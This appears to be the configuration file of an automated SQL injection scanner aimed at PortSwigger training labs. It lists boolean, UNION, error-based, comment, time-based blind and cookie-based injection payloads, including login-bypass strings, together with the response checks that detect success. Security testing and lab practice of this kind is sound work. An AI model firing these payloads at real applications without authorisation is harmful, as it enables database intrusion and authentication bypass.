strategies:
  # ============ PORTSWIGGER-OPTIMIZED BOOLEAN-BASED ============
  - name: boolean_basic_hidden_data
    description: PortSwigger basic hidden data detection
    target: query
    detection:
      type: length_delta
      min_delta: 500
    payloads:
      - "' OR '1'='1"
      - "' OR 1=1--"
      - "' OR 'x'='x"
      - "1' OR '1'='1"
      - "admin' OR '1'='1"

  - name: boolean_and_injection
    description: AND-based boolean injection
    target: query
    detection:
      type: length_delta
      min_delta: 100
    payloads:
      - "' AND '1'='1"
      - "' AND 1=1--"
      - "1' AND 1=1--"
      - "') AND ('1'='1"

  # ============ UNION-BASED FOR PORTSWIGGER ============
  - name: union_simple
    description: Simple UNION SELECT injection
    target: query
    detection:
      type: length_delta
      min_delta: 200
    payloads:
      - "' UNION SELECT NULL--"
      - "' UNION SELECT 'a'--"
      - "' UNION SELECT 1--"
      - "' UNION SELECT 1,2--"
      - "' UNION SELECT 1,2,3--"
      - "' UNION SELECT 1,2,3,4--"

  # ============ ERROR-BASED DETECTION ============
  - name: error_based_basic
    description: Basic error-based injection
    target: query
    detection:
      type: error_detection
    payloads:
      - "' AND 1=CAST(1 AS INT)--"
      - "' AND extractvalue(0,version())--"
      - "' AND updatexml(0,version(),0)--"

  # ============ COMMENT-BASED ============
  - name: comment_injection
    description: Comment-based SQL injection
    target: query
    detection:
      type: length_delta
      min_delta: 300
    payloads:
      - "' --"
      - "' #"
      - "' /*"
      - "admin' --"
      - "' OR 1=1 --"

  # ============ TIME-BASED BLIND ============
  - name: time_based_simple
    description: Time-based blind SQL injection
    target: query
    detection:
      type: time_delay
      threshold: 3
    payloads:
      - "' AND SLEEP(3)--"
      - "' OR SLEEP(3)--"
      - "1' AND SLEEP(3)--"
      - "' AND pg_sleep(3)--"

  # ============ PORTSWIGGER COOKIE LABS ============
  - name: tracking_cookie_boolean
    description: TrackingId cookie boolean-based SQLi
    target: cookie
    cookie_name: TrackingId
    detection:
      type: length_delta
      min_delta: 100
    payloads:
      - "' OR '1'='1"
      - "' AND '1'='1"
      - "' OR 1=1--"
      - "' AND (SELECT 'x' FROM users LIMIT 1)='x'--"

  - name: tracking_cookie_time_delay
    description: TrackingId time-based blind injection
    target: cookie
    cookie_name: TrackingId
    detection:
      type: time_delay
      threshold: 3
    payloads:
      - "' AND SLEEP(3)--"
      - "' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END)||'"
      - "' AND pg_sleep(3)--"



